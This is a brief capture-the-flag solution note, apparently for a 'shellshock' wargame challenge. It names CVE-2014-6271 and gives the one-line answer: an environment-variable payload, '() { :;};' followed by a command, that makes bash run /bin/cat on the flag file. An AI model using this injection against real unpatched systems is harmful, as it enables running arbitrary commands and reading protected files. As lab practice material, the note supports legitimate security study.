# shellshock


```
shellshock@pwnable:~$ ./shellshock 
shock_me
```

CVE-2014-6271

>senv x='() { :;}; /bin/cat flag' ./shellshock